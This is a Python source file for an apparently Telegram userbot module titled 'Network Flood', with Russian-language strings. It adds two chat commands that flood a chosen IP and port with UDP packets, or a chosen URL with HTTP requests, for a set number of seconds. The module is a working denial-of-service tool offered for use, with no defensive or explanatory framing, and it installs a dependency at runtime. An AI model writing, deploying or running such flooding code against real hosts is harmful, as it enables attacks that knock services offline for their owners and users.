import socket
import asyncio
import subprocess
import sys
from telethon.tl.types import Message
from .. import loader, utils

@loader.tds
class NetworkFloodModule(loader.Module):
    """Модуль для интенсивной отправки UDP и HTTP запросов"""

    strings = {
        "name": "Network Flood",
        "udp_start": "<b>🚀 Начинаем интенсивную отправку UDP пакетов на {}:{} на {} секунд...</b>",
        "http_start": "<b>🚀 Начинаем интенсивную отправку HTTP запросов на {} на {} секунд...</b>",
        "complete": "<b>✅ Отправка завершена.</b>",
        "error": "<b>Ошибка:</b> Некорректные аргументы."
    }

    async def client_ready(self, client, db):
        self.client = client
        self.install_dependencies()

    def install_dependencies(self):
        """Устанавливает необходимые зависимости"""
        try:
            import aiohttp
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp"])

    async def udpcmd(self, message: Message):
        """[ip] [port] [sec] - Отправляет UDP пакеты на указанный IP и порт на заданное количество секунд"""
        args = utils.get_args_raw(message)
        if len(args.split()) != 3:
            await utils.answer(message, self.strings("error"))
            return

        ip, port, sec = args.split()
        try:
            port = int(port)
            sec = int(sec)
        except ValueError:
            await utils.answer(message, self.strings("error"))
            return

        await utils.answer(message, self.strings("udp_start").format(ip, port, sec))
        await self.udp_flood(ip, port, sec)
        await utils.answer(message, self.strings("complete"))

    async def udp_flood(self, ip, port, duration):
        """ Функция для интенсивной отправки UDP пакетов """
        start_time = asyncio.get_event_loop().time()
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            while True:
                if (asyncio.get_event_loop().time() - start_time) > duration:
                    break
                sock.sendto(b'RandomData', (ip, port))

    async def httpcmd(self, message: Message):
        """[url] [sec] - Отправляет HTTP запросы на указанный URL на заданное количество секунд"""
        args = utils.get_args_raw(message)
        if len(args.split()) != 2:
            await utils.answer(message, self.strings("error"))
            return

        url, sec = args.split()
        try:
            sec = int(sec)
        except ValueError:
            await utils.answer(message, self.strings("error"))
            return

        await utils.answer(message, self.strings("http_start").format(url, sec))
        await self.http_flood(url, sec)
        await utils.answer(message, self.strings("complete"))

    async def http_flood(self, url, duration):
        """ Функция для интенсивной отправки HTTP запросов """
        import aiohttp
        end_time = asyncio.get_event_loop().time() + duration
        async with aiohttp.ClientSession() as session:
            while True:
                if asyncio.get_event_loop().time() >= end_time:
                    break
                asyncio.create_task(self.send_http_request(session, url))

    async def send_http_request(self, session, url):
        try:
            async with session.get(url) as response:
                await response.text()
        except Exception as e:
            print(f"Ошибка запроса: {e}")

# Пример создания и использования модуля
module = NetworkFloodModule()
